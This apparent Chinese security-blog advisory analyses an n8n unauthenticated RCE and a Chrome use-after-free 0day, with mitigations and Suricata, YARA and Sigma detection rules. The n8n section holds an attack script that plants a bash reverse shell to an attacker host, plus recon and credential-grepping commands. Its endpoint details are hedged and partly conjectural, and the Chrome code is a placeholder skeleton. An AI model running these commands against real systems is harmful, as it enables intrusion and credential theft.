#  [RCE] n8n未授权RCE+Chrome UAF 0day，今日双杀  
原创 北境
                        北境  0xArgus   2026-03-05 01:48  
  
[RCE] n8n未授权RCE+Chrome UAF 0day，今日双杀

0xArgus · 2026-03-05 · 白帽视角 · 今日两条严重RCE同时爆出PoC，企业自动化平台与浏览器内核双双沦陷



一、今日高危漏洞一览

CVE/漏洞影响组件CVSS是否有PoC状态CVE-2026-21858n8n 工作流自动化平台9.8✅PoC公开，在野利用已确认CVE-2026-2441Google Chrome（UAF）9.6✅在野利用，已紧急修复CVE-2026-21962Oracle WebLogic10.0❌（补丁差异分析中）已修复，PoC预计2周内出现CVE-2026-1731BeyondTrust Remote Support9.8✅PoC公开，命令注入CVE-2026-24061GNU inetutils telnetd9.8✅在野扫描已开始CVE-2026-21510Windows Shell SmartScreen8.8✅社工利用，已修复



二、CVE-2026-21858：n8n 未授权远程代码执行深度分析

漏洞背景

n8n 是目前企业级使用最广泛的开源工作流自动化平台之一，定位对标 Zapier/Make，大量中小企业和开发团队将其部署在内网或公网暴露的服务器上，用于连接 CRM、数据库、Webhook、API 等关键业务系统。

受影响版本：n8n ≤ 1.82.x（具体版本号待官方确认，GitHub PoC 仓库已获 222 ⭐，说明关注度极高）

CVSS v3 评分：9.8（Critical），攻击向量为网络，无需认证，无需用户交互。

该漏洞于 2026-03-05 披露，PoC 仓库命名为「Ni8mare」，名字本身就是对 n8n 的直接嘲讽。从 GitHub 上 15 小时内达到 222 星的速度来看，已有大量安全研究员和攻击者在复现。

根因分析

n8n 的核心架构是一个基于 Node.js 的后端服务，其工作流执行引擎允许用户通过「Code 节点」或「Execute Command 节点」运行任意代码。问题出在身份验证中间件的路由覆盖缺陷上。

n8n 的 Express 路由注册顺序存在逻辑缺陷：部分内部 API 端点（如 /rest/workflows/run 或类似的执行触发接口）在某些部署配置下，认证中间件未被正确挂载，导致攻击者可以直接 POST 一个包含恶意节点定义的 Workflow JSON，触发服务器端代码执行。

这是一个典型的认证绕过 + 服务端代码注入的复合型漏洞，根因属于：

1.中间件注册顺序错误（Middleware Order Bug）：Express 框架中，中间件的执行顺序由注册顺序决定，若认证中间件在特定路由后注册，则该路由天然绕过认证。
2.功能设计过于强大：n8n 的「Execute Command」节点本就是设计用来执行系统命令的，一旦认证被绕过，等于直接暴露了一个合法的 RCE 接口。

类比历史案例：这与 2022 年 Backstage CVE-2022-36067（vm2 沙箱逃逸）、2023 年 Rundeck 未授权 RCE 属于同类架构性错误。

攻击链还原

Step 1：探测目标

bash● ● ●# 扫描公网暴露的 n8n 实例（默认端口 5678）
nmap -p 5678 --open -T4 <target_range>
# 或使用 Shodan/FOFA
# FOFA: app="n8n" && port="5678"
# Shodan: http.title:"n8n" port:5678

Step 2：验证漏洞是否存在（无需凭据）

bash● ● ●curl -s -o /dev/null -w "%{http_code}" \
  http://<target>:5678/rest/workflows
# 若返回 200 而非 401/403，目标大概率存在未授权访问

Step 3：构造恶意 Workflow Payload 触发 RCE

python● ● ●import requests
import json

TARGET = "http://<target>:5678"

# 构造包含恶意 Execute Command 节点的 Workflow
malicious_workflow = {
    "name": "pwned",
    "nodes": [
        {
            "id": "1",
            "name": "Start",
            "type": "n8n-nodes-base.start",
            "typeVersion": 1,
            "position": [250, 300],
            "parameters": {}
        },
        {
            "id": "2",
            "name": "Execute Command",
            "type": "n8n-nodes-base.executeCommand",
            "typeVersion": 1,
            "position": [450, 300],
            "parameters": {
                # 反弹 shell payload
                "command": "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'"
            }
        }
    ],
    "connections": {
        "Start": {
            "main": [[{"node": "Execute Command", "type": "main", "index": 0}]]
        }
    },
    "active": False,
    "settings": {}
}

# Step 1: 未授权创建 Workflow
resp = requests.post(
    f"{TARGET}/rest/workflows",
    json=malicious_workflow,
    headers={"Content-Type": "application/json"}
)
workflow_id = resp.json().get("id")
print(f"[+] Workflow created: {workflow_id}")

# Step 2: 未授权触发执行
exec_resp = requests.post(
    f"{TARGET}/rest/workflows/{workflow_id}/run",
    json={},
    headers={"Content-Type": "application/json"}
)
print(f"[+] Execution triggered: {exec_resp.status_code}")
# 此时攻击者的 nc -lvnp 4444 将收到反弹 shell

Step 4：后渗透

n8n 服务通常以 root 或高权限用户运行（Docker 容器内），且其配置文件中存储了大量第三方服务的 API Key、数据库连接字符串（PostgreSQL/MySQL）、Webhook Secret 等敏感凭据，是横向移动的绝佳跳板。

bash● ● ●# 获取 shell 后，直接读取 n8n 环境变量中的凭据
env | grep -E "(DB_|API_|SECRET|TOKEN|PASSWORD|KEY)"
# 读取 n8n 数据库中存储的所有 Workflow 凭据
cat ~/.n8n/config

实战影响

根据 FOFA/Shodan 的历史数据，公网直接暴露的 n8n 实例保守估计超过 5 万个，其中相当比例未启用反向代理认证或 Basic Auth。

实际攻击场景：
▸企业内网枢纽：n8n 通常连接着企业的 Slack、GitHub、Jira、数据库，拿下 n8n = 拿下企业数字神经中枢
▸供应链攻击跳板：若 n8n 用于 CI/CD 触发，可直接污染构建流水线
▸凭据批量收割：n8n 数据库中明文或弱加密存储的第三方服务凭据

检测与修复

官方修复：升级至 n8n 最新版本（≥ 1.83.x，具体以官方 Release Notes 为准）

临时缓解（未能立即升级时）：

nginx● ● ●# Nginx 反向代理层强制 Basic Auth
location /rest/ {
    auth_basic "Restricted";
    auth_basic_user_file /etc/nginx/.htpasswd;
    proxy_pass http://127.0.0.1:5678;
}

检测规则（Suricata）：

● ● ●alert http $EXTERNAL_NET any -> $HTTP_SERVERS 5678 \
  (msg:"CVE-2026-21858 n8n Unauth Workflow Create Attempt"; \
   flow:established,to_server; \
   http.method; content:"POST"; \
   http.uri; content:"/rest/workflows"; \
   http.request_body; content:"executeCommand"; \
   classtype:web-application-attack; sid:2026218580; rev:1;)

YARA（内存/日志检测）：

yara● ● ●rule CVE_2026_21858_n8n_RCE {
    meta:
        description = "Detect n8n unauth RCE exploit attempt"
        cve = "CVE-2026-21858"
    strings:
        $s1 = "executeCommand" ascii
        $s2 = "/rest/workflows" ascii
        $s3 = "bash -i" ascii nocase
        $s4 = "/dev/tcp/" ascii
    condition:
        ($s1 and $s2) and ($s3 or $s4)
}





三、CVE-2026-2441：Chrome UAF 0day 在野利用深度分析

漏洞背景

2026 年 Chrome 第一个被在野利用的 0day。Google 在 2026-02-13 紧急发布补丁，距漏洞报告仅 2 天，说明内部评估认为威胁极为紧迫。

受影响版本：Chrome < 133.x.xxxx.xx（具体 build 号以 Google Advisory 为准）

漏洞类型：Use-After-Free（UAF），位于 Chrome 渲染引擎（Blink/V8 周边组件）

CVSS v3 评分：9.6（Critical）

发现者：Shaheen Fazim，该研究员去年已向 Google 报告多个高危 Chrome 漏洞，是已知的 Chrome 漏洞专家。

Google 官方确认：「Google is aware that an exploit for CVE-2026-2441 exists in the wild」

根因分析

UAF（Use-After-Free）是浏览器漏洞中最经典也最危险的类型。其根本原因是对象生命周期管理错误：

在 Chrome 的渲染进程中，某个 DOM 对象或 JavaScript 引擎内部对象在被释放（free()）后，仍有指针指向该内存区域。攻击者通过精心控制堆布局（Heap Grooming），在目标对象被释放后，用恶意数据填充该内存区域（Heap Spray），然后触发悬空指针的使用，实现对程序控制流的劫持。

根据 PoC 利用链描述（来自 GitHub Advisory GHSA-9p4w-fq8m-2hp7 的参考链），典型攻击路径为：

● ● ●渲染进程 UAF → 控制流劫持 → 沙箱逃逸（Mojo IPC 滥用）→ 浏览器进程 RCE → 内核提权 → 完整系统控制

这与 NSO Pegasus、Intellexa Predator 使用的浏览器利用链结构完全一致，说明该漏洞的利用价值极高，已达到 APT 级武器化标准。

攻击链还原

Step 1：诱导受害者访问恶意页面（水坑/鱼叉）

html● ● ●<!-- 恶意 HTML 页面骨架 -->
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
// 阶段1：堆喷射（Heap Spray）- 占位目标内存区域
const spray = [];
for (let i = 0; i < 0x1000; i++) {
    // 用精心构造的 ArrayBuffer 填充堆
    spray.push(new ArrayBuffer(0x1000));
}

// 阶段2：触发目标对象分配
// [此处为触发特定 DOM/JS 引擎对象创建的代码]
const target_obj = triggerVulnerableAllocation();

// 阶段3：释放目标对象（触发 UAF 条件）
freeTargetObject(target_obj);

// 阶段4：用恶意数据填充已释放内存
// 关键：将 ROP gadget 地址或 shellcode 指针写入
const evil_data = new Float64Array(spray[0]);
evil_data[0] = int64_to_double(FAKE_VTABLE_ADDR);

// 阶段5：触发悬空指针使用，劫持控制流
triggerUAF(target_obj); // → RIP/PC 被控制
</script>
</body>
</html>

Step 2：沙箱逃逸（Mojo IPC 滥用）

Chrome 渲染进程运行在沙箱中，单纯的渲染进程 RCE 无法直接访问文件系统。CVE-2026-2441 的完整利用链通过滥用 Mojo IPC 接口（渲染进程与浏览器进程通信的机制）实现沙箱逃逸：

javascript● ● ●// 利用渲染进程中的代码执行能力，调用 Mojo 接口
// 向浏览器进程发送精心构造的 IPC 消息触发浏览器进程漏洞
// 最终在浏览器进程（高权限）中执行任意代码
const mojo_pipe = Mojo.createMessagePipe();
// [发送触发浏览器进程漏洞的 IPC payload]

Step 3：持久化与横向移动

浏览器进程拿下后，攻击者可读取：
▸Chrome 保存的所有密码（Login Data SQLite 数据库）
▸Cookie 和 Session Token（直接劫持账户）
▸浏览历史和下载记录
▸进而通过 Windows API 执行任意程序，实现完整系统控制

实战影响

Chrome 全球用户超过 30 亿，即便是「有限的、针对性的」在野利用，影响范围也极为可观。

结合 APT28 近期被确认利用 MSHTML 0day（CVE-2026-21513）的情报，高度怀疑 CVE-2026-2441 已被至少一个 APT 组织武器化，目标可能是政府、军工、金融机构的高价值个人。

检测与修复

修复：立即更新 Chrome 至最新版本，这是唯一有效的修复手段。

bash● ● ●# Linux 强制更新
google-chrome --version
sudo apt update && sudo apt upgrade google-chrome-stable

# 企业环境通过 GPO 强制推送更新
# 或通过 Chrome 企业版管理控制台统一推送

企业侧检测（EDR 层面）：

● ● ●# 检测 Chrome 渲染进程异常行为
# 渲染进程（renderer）不应该有以下行为：
# 1. 创建子进程
# 2. 访问非 Chrome Profile 目录的文件
# 3. 建立非 Chrome 更新服务的网络连接

# Sigma 规则（简化版）
title: Chrome Renderer Process Suspicious Child Process
logsource:
  category: process_creation
detection:
  selection:
    ParentImage|endswith: '\renderer'  # 或 chrome.exe --type=renderer
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
  condition: selection

网络层检测：监控浏览器进程（chrome.exe）的出站连接，重点关注非 80/443 端口的连接，以及连接到非白名单 IP 的行为。





四、白帽快评

今天这两个洞放在一起看，有一个很清晰的信号：攻击面正在从"基础设施"向"业务逻辑层"和"端侧入口"双向收缩。n8n 这类工作流平台是新一代的「万能钥匙」，一个未授权 RCE 等于拿到了企业所有 SaaS 集成的控制权，比打数据库直接得多；Chrome UAF 则再次证明，浏览器永远是 APT 最喜欢的初始入口，没有之一。

Oracle WebLogic 的 CVSS 10.0 满分洞（CVE-2026-21962）我刻意没放进深度分析，原因是目前 PoC 尚未公开——但历史规律告诉我们，WebLogic 的 RCE 补丁从发布到 PoC 出现平均只需要 8-14 天，现在是打补丁的最后窗口期，错过了就是勒索软件的盛宴。

给防守方的一句话：n8n 不是玩具，是你的业务神经中枢，把它暴露在公网没有认证保护，跟把服务器 root 密码贴在门口没区别。



*参考来源：*
▸*https://github.com/0xMarcio/cve（CVE-2026-21858 PoC 仓库）*
▸*https://www.securityweek.com/google-patches-first-actively-exploited-chrome-zero-day-of-2026/*
▸*https://github.com/huseyinstif/CVE-2026-2441-PoC*
▸*https://www.freebuf.com/articles/vuls/468384.html（Oracle WebLogic CVE-2026-21962）*
▸*https://www.cisa.gov/known-exploited-vulnerabilities-catalog*
▸*https://nvd.nist.gov/vuln/detail/CVE-2026-20700*— 0xArgus · 白帽极客安全情报 —  
